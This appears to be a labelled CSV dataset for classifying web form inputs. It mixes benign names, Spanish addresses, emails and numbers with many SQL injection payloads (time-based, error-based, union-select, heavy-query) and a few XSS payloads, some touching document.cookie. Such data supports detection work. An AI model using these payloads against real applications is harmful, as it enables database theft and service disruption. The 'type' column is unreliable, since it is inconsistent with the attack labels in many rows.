Text,attack_type,Label,type
od89,norm,0,normal
"vinyals, 117 4?e",norm,0,normal
armstrong@viajesnacionales.pn,norm,0,normal
29222370l,norm,0,normal
jado,norm,0,normal
abell lamarca,norm,0,normal
"1,(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",sqli,1,sql
"-5024%"" or make_set(3321=7355,7355) and ""%""=""",sqli,1,normal
agapito,norm,0,normal
3243632191761445,norm,0,normal
"1"") as dfmm where 7563=7563 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
capileira,norm,0,normal
leshowit,norm,0,normal
madrazo 115,norm,0,normal
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (5130=5130",sqli,1,sql
39200,norm,0,normal
1')) as jzoh where 6484=6484 and 7364=4233--,sqli,1,sql
3158,norm,0,normal
2366,norm,0,normal
cang,norm,0,normal
1' where 4795=4795 and 4595=4595#,sqli,1,normal
75010741j,norm,0,normal
5arneci052,norm,0,normal
"1') where 8252=8252 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"alcalde esteban minguez, 169, 12?b",norm,0,normal
7395,norm,0,normal
alh4a3,norm,0,normal
"fivasa, 15,",norm,0,normal
torrie,norm,0,normal
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('bwka'='bwka,sqli,1,sql
blomfield@enlanzarote.com.al,norm,0,normal
"-9996' or make_set(1237=7111,7111)",sqli,1,normal
valenti grans,norm,0,normal
fauno,norm,0,normal
1875,norm,0,normal
"-3215"") union all select 4457,4457,4457,4457,4457#",sqli,1,sql
endoblar,norm,0,normal
tapies ximenis,norm,0,normal
1%') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'=',sqli,1,sql
mera alccer,norm,0,normal
ors,norm,0,normal
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('qvoy'='qvoy",sqli,1,sql
4067,norm,0,normal
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
sobradillo,norm,0,normal
"-3782%"") or make_set(9354=9354,7185) and (""%""=""",sqli,1,normal
valdelosa,norm,0,normal
1 and (select * from (select(sleep(5)))fzno)-- ybmz,sqli,1,sql
enaltecedor,norm,0,normal
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,sqli,1,sql
watanabe,norm,0,normal
gilden@gopersonalfitness.ua,norm,0,normal
"-9352""))) or 3038=3038",sqli,1,normal
372,norm,0,normal
slartiba,norm,0,normal
villanueva de algaidas,norm,0,normal
"1%')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='",sqli,1,sql
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('pshn' like 'pshn",sqli,1,sql
"1"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""vnso"" like ""vnso",sqli,1,sql
"1')) or elt(6272=6272,sleep(5)) and (('fele'='fele",sqli,1,normal
de martino valds,norm,0,normal
1%';select sleep(5)#,sqli,1,sql
"1'||(select 'ezse' from dual where 3821=3821;select count(*) from generate_series(1,5000000)--",sqli,1,sql
6441854276984473,norm,0,normal
fowler,norm,0,normal
retiendas,norm,0,normal
"-3090"" or make_set(9354=9354,7185) and ""qowe"" like ""qowe",sqli,1,normal
playado,norm,0,normal
1;select (case when (3076=3596) then 3076 else 3076*(select 3076 from mysql.db) end)#,sqli,1,sql
36432557m,norm,0,normal
"-9751""))) or 5929=3884--",sqli,1,sql
0a3ramplar,norm,0,normal
guinee@misanimalesdomesticos.jp,norm,0,normal
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
1%')) and (3020=3020)*6703 and (('%'=',sqli,1,normal
abajo,norm,0,normal
documet recasens,norm,0,normal
t0t0,norm,0,normal
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('fnon' like 'fnon",sqli,1,sql
ehrenfri,norm,0,normal
"esperanza, 189 10-g",norm,0,normal
-3501') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('spvx'='spvx,sqli,1,sql
clodettes_pierson@repretexbcn.ml,norm,0,normal
torcac2,norm,0,normal
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
"1"");begin dbms_lock.sleep(5); end and (""qkkn"" like ""qkkn",sqli,1,sql
"1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1,sql
4159457629727955,norm,0,normal
"1%"")) union all select null,null,null,null,null,null#",sqli,1,sql
4458,norm,0,normal
25164,norm,0,normal
18310,norm,0,normal
2532457145340118,norm,0,normal
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('swfj' like 'swfj",sqli,1,sql
1')) and 4650=1322#,sqli,1,normal
"1"")) as jmoy where 9676=9676 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
cybolski.doumanian@cortinasartesol.bh,norm,0,normal
1%' and 9127=7687--,sqli,1,sql
wun,norm,0,normal
"c/jon nios hermosos, s/n 12-a",norm,0,normal
frades de la sierra,norm,0,normal
"-9886%'))) union all select 5191,5191,5191,5191,5191,5191,5191--",sqli,1,sql
1))) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
masmitj,norm,0,normal
95417371p,norm,0,normal
83677248m,norm,0,normal
shalne,norm,0,normal
<script>alert(/xss/.source)</script>,xss,2,xss
murgua aversa,norm,0,normal
brayam,norm,0,normal
almazora/almassora,norm,0,normal
1064,norm,0,normal
coray@ciaplast.ir,norm,0,normal
-6215') or (8459=8459)*4906,sqli,1,normal
cazoln,norm,0,normal
tope4a5o,norm,0,normal
1%' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and '%'=',sqli,1,sql
"1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu",sqli,1,sql
1'||(select 'hlxd' from dual where 2615=2615 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))||',sqli,1,sql
ansa-sobrarbe,norm,0,normal
"1'))) and elt(4249=4249,7259) and ((('kbkz'='kbkz",sqli,1,normal
1' where 7191=7191 rlike sleep(5)--,sqli,1,sql
"1%'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
4124162736834322,norm,0,normal
10411,norm,0,normal
0861204544361308,norm,0,normal
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,sql
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1%"")));waitfor delay '0:0:5'--",sqli,1,sql
9571001152380461,norm,0,normal
"1%') and elt(4670=9403,9403) and ('%'='",sqli,1,normal
"1'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"glorieta farmaceutico perez jimenez 197,",norm,0,normal
abellot*ada,norm,0,normal
hervey@annoyanc.eh,norm,0,normal
voltio,norm,0,normal
abarcuzar,norm,0,normal
1') or (select * from (select(sleep(5)))ydpu),sqli,1,sql
"once paradas, 139",norm,0,normal
e88r6bera,norm,0,normal
protti tarrasa,norm,0,normal
mugione de manuel,norm,0,normal
"1') as mvai where 5856=5856 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
eduviges,norm,0,normal
1;begin dbms_lock.sleep(5); end--,sqli,1,sql
villafranca del bierzo,norm,0,normal
paula,norm,0,normal
1%')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',sqli,1,sql
turro,norm,0,normal
"c/ altamira 179,",norm,0,normal
"labiano, s/n 7?a",norm,0,normal
3156,norm,0,normal
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('smrw' like 'smrw,sqli,1,sql
14ab214c6n,norm,0,normal
"1 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
6659103638292546,norm,0,normal
"1) as qeav where 8127=8127 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
kemr@soycatalan.ga,norm,0,normal
78260205z,norm,0,normal
1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#,sqli,1,sql
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'jiyx'='jiyx",sqli,1,sql
aristizbal faura,norm,0,normal
47690,norm,0,normal
rayen,norm,0,normal
"1 where 2988=2988 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,sqli,1,sql
10328,norm,0,normal
49322,norm,0,normal
re6lexin,norm,0,normal
"-2798'+(select 'emui' where 9565=9565 union all select 9565,9565,9565,9565--",sqli,1,sql
ocaa alcover,norm,0,normal
cuevas del almanzora,norm,0,normal
7265260392335726,norm,0,normal
"callejon sierpes 128, 5-e",norm,0,normal
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,sql
woronov@connect.gr,norm,0,normal
"1""));(select * from (select(sleep(5)))srmq) and ((""hxdd""=""hxdd",sqli,1,sql
22571,norm,0,normal
50693,norm,0,normal
leanizbarrutia mindiola,norm,0,normal
09140,norm,0,normal
"1"");waitfor delay '0:0:5'--",sqli,1,sql
"""x""><img onerror=""alert(1)""></picture>",xss,2,xss
canal saracho,norm,0,normal
xixian,norm,0,normal
"1%"") and (3020=3020)*6703 and (""%""=""",sqli,1,normal
saunders@titulosoficiales.web,norm,0,normal
backy@legami.tz,norm,0,normal
nandan,norm,0,normal
6862303368797459,norm,0,normal
45643261z,norm,0,normal
45790,norm,0,normal
gargajienta,norm,0,normal
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('abcf' like 'abcf",sqli,1,sql
abadal braup,norm,0,normal
8357,norm,0,normal
iago,norm,0,normal
cecchetto casavieja,norm,0,normal
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",sqli,1,sql
7298091091245974,norm,0,normal
meenaksh,norm,0,normal
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
-7779') where 4976=4976 or 6872=6872--,sqli,1,sql
1') waitfor delay '0:0:5' and ('peyv' like 'peyv,sqli,1,normal
44181680z,norm,0,normal
escribida,norm,0,normal
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",sqli,1,sql
"calle jaen 186, 8h",norm,0,normal
"plaa creu gran, 65",norm,0,normal
89285662f,norm,0,normal
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('%'='",sqli,1,sql
"c/ ciudad de sueca s/n,",norm,0,normal
"1)) as bebl where 2597=2597 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
"norte 131, 8?e",norm,0,normal
desligar,norm,0,normal
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,sqli,1,sql
"1%"" and elt(5345=8751,8751) and ""%""=""",sqli,1,normal
prepost1ra9in,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null#",sqli,1,sql
63734935a,norm,0,normal
"1'+(select tvpj where 7058=7058 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1,sql
8671,norm,0,normal
delsa,norm,0,normal
carmelo,norm,0,normal
08214,norm,0,normal
"avinguda castellot, 116,",norm,0,normal
cubillas de santa marta,norm,0,normal
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",sqli,1,sql
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
62616848s,norm,0,normal
leeson,norm,0,normal
"c/ marcos de torniello, 67 9?d",norm,0,normal
kapp,norm,0,normal
espndola pavajeau,norm,0,normal
7666460029738411,norm,0,normal
48508,norm,0,normal
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('jylk'='jylk",sqli,1,normal
muiz,norm,0,normal
tormellas,norm,0,normal
guillena,norm,0,normal
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",sqli,1,sql
marscha,norm,0,normal
"-4371'))) union all select 7465,7465,7465,7465,7465,7465,7465#",sqli,1,sql
carissa,norm,0,normal
6255246118893731,norm,0,normal
03770036z,norm,0,normal
7118,norm,0,normal
"1"" where 6325=6325 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""endx""=""endx",sqli,1,sql
angele6@juegossonic.com.eh,norm,0,normal
"1'||(select 'jonh' from dual where 2415=2415 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
-4901) or 3407=6442#,sqli,1,normal
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# cykf,sqli,1,sql
moux claver,norm,0,normal
9231205976119063,norm,0,normal
ons,norm,0,normal
"1"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
verdier@zaya.name,norm,0,normal
303,norm,0,normal
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""bnyh""=""bnyh",sqli,1,normal
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt",sqli,1,sql
escartivana,norm,0,normal
perih1lio,norm,0,normal
"circon, 84, 13-e",norm,0,normal
"1"" where 6179=6179;begin user_lock.sleep(5); end--",sqli,1,sql
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""pawh""=""pawh",sqli,1,sql
trujillo fornalino,norm,0,normal
">""<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",xss,2,sql
hakeem,norm,0,normal
1);begin dbms_lock.sleep(5); end and (9416=9416,sqli,1,sql
cuitada,norm,0,normal
2962225495583197,norm,0,normal
s46085i9_s9,norm,0,normal
23338,norm,0,normal
san magin 180,norm,0,normal
sansalva farreron,norm,0,normal
carricar,norm,0,normal
19392,norm,0,normal
erguven,norm,0,normal
o.toole,norm,0,normal
37068097d,norm,0,normal
14970,norm,0,normal
17744,norm,0,normal
b059ucon3da,norm,0,normal
1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,sqli,1,sql
"-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--",sqli,1,sql
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('xpks' like 'xpks",sqli,1,sql
5393761266970595,norm,0,normal
c1l674n,norm,0,normal
8omp0r1ti6a,norm,0,normal
09120,norm,0,normal
"-8838"")) as xisn where 2749=2749 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
4093889794734196,norm,0,normal
"colmenares, 74,",norm,0,normal
"calle doctor ruiz de la herran, s/n, 7b",norm,0,normal
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""pmpk"" like ""pmpk",sqli,1,normal
macuare ribes,norm,0,normal
hillevi@womenatwork.gg,norm,0,normal
55964057c,norm,0,normal
"escritor nicolas del paso, 95",norm,0,normal
victoria,norm,0,normal
c/ espiritu santo 126,norm,0,normal
soulef,norm,0,normal
37246742j,norm,0,normal
alvis,norm,0,normal
grajear,norm,0,normal
pullman-mcclintock@surcosur.st,norm,0,normal
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (5037=5037",sqli,1,sql
"1 where 1842=1842 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
buhr_hubschmidt@hiteurope.al,norm,0,normal
d6ntrotr566,norm,0,normal
ber269u31a,norm,0,normal
olea de boedo,norm,0,normal
1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',sqli,1,sql
capella gorrn,norm,0,normal
1') as ihsc where 3978=3978;begin user_lock.sleep(5); end--,sqli,1,sql
">""<script>alert(document.cookie)</script>@gmail.com",xss,2,xss
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('lwrk' like 'lwrk",sqli,1,sql
"1');select count(*) from generate_series(1,5000000) and ('cewn'='cewn",sqli,1,sql
8099,norm,0,normal
83288994z,norm,0,normal
6i4t562e7a,norm,0,normal
-2745)) as aywp where 9735=9735 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
84740483l,norm,0,normal
jefferson-kuznezov@productosgarantizados.bb,norm,0,normal
andratx,norm,0,normal
"1)) as wufr where 5239=5239 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
">""<div style=""background-image: url(javascript:document.cookie=true;)"">",xss,2,xss
escudern,norm,0,normal
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
"1;iif(5257=5257,1,1/0)",sqli,1,sql
12232,norm,0,normal
negredo,norm,0,normal
humphrie,norm,0,normal
1' where 2134=2134 rlike (select (case when (3613=2090) then 1 else 0x28 end))--,sqli,1,sql
"1%')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",sqli,1,sql
"plaa zenobia camprubi, 81, 13-d",norm,0,normal
"camino caserio parada, s/n, 4b",norm,0,normal
"1'||(select 'xyrk' from dual where 9844=9844 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
1403,norm,0,normal
"1' in boolean mode) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1) where 7096=7096;begin user_lock.sleep(5); end--,sqli,1,sql
salma,norm,0,normal
1%';begin dbms_lock.sleep(5); end--,sqli,1,sql
68203466w,norm,0,normal
29500,norm,0,normal
0273416778128431,norm,0,normal
27915,norm,0,normal
empece9ora,norm,0,normal
1') waitfor delay '0:0:5',sqli,1,normal
erill crespo,norm,0,normal
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
despuig,norm,0,normal
"calle venus, 81 2-a",norm,0,normal
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ggiw'='ggiw",sqli,1,sql
quest@palmatraducciones.pw,norm,0,normal
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (7338=7338",sqli,1,sql
sellees,norm,0,normal
1))) and 8990=4775 and (((1894=1894,sqli,1,normal
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""pdsy"" like ""pdsy",sqli,1,sql
jamal,norm,0,normal
6492468041805340,norm,0,normal
cossy@salaparis.tv,norm,0,normal
"-6254%'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
1')));select (case when (7980=3703) then 7980 else 7980*(select 7980 from information_schema.character_sets) end)#,sqli,1,sql
gauchaje,norm,0,normal
"1"" where 5927=5927;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1'||(select 'ogyu' from dual where 6691=6691;select (case when (8820=4648) then 8820 else 8820*(select 8820 from information_schema.character_sets) end)#,sqli,1,sql
"1%"")) or elt(5873=5873,sleep(5))#",sqli,1,normal
"pasaje cesar arbasia, 99, 3-a",norm,0,normal
6603392129925704,norm,0,normal
96622444l,norm,0,normal
1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',sqli,1,sql
-6473' union all select 7537#,sqli,1,sql
renette,norm,0,normal
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('hllf'='hllf",sqli,1,sql
"1'+(select 'jkgf' where 7487=7487;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"guipuzcoa 198, 1?d",norm,0,normal
azadonad?a,norm,0,normal
"1"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""vypw"" like ""vypw",sqli,1,sql
3027,norm,0,normal
"errekerte 113,",norm,0,normal
elias pallares,norm,0,normal
ojeda fita,norm,0,normal
